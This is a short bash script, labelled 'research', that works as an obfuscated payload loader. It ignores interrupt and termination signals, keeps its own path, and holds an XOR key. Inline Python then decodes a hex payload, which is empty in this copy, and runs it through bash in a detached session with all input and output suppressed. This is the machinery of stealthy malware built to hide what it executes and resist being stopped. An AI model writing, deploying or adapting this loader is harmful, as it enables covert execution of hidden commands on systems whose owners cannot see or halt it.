#!/bin/bash
# jomok.sh - sudo3rs - research
trap "" SIGINT SIGTERM SIGHUP
export ORIG_PATH="${ORIG_PATH:-$(readlink -f "$0")}"
export SELF_PATH=$(readlink -f "$0")
export P_HEX=""
export K_HEX="ba8c0659d2200ea12edce66bc743f8839296df6407ed4cfa05443363f8f7ddb7"
python3 -c "
import os,subprocess
p=bytes.fromhex(os.environ['P_HEX'])
k=bytes.fromhex(os.environ['K_HEX'])
d=bytes([b^k[i%len(k)]for i,b in enumerate(p)]).decode()
subprocess.Popen(['/bin/bash','-c',d],start_new_session=True,stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
"
